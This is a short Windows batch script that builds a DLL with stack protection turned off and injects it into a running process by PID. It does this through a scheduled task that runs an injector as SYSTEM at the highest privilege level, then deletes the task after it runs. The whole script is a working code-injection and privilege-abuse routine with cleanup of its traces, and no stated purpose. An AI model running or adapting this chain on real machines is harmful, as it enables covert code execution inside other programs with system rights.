@echo off
call "C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\VC\Auxiliary\Build\vcvars64.bat" >nul
cd /d C:\Users\User\trackA
cl /nologo /std:c++17 /O2 /EHsc /MT /GS- /LD dfgobj.cpp /Fe:dfgobj.dll /link user32.lib > gobj_build.log 2>&1
echo GB=%errorlevel%
type gobj_build.log
schtasks /create /tn dfa_gobj /tr "C:\Users\User\trackA\dfsecinject.exe 33172 C:\Users\User\trackA\dfgobj.dll" /sc once /st 00:00 /ru SYSTEM /rl HIGHEST /f >nul
schtasks /run /tn dfa_gobj
ping -n 8 127.0.0.1 >nul
schtasks /delete /tn dfa_gobj /f >nul
type gobj.txt
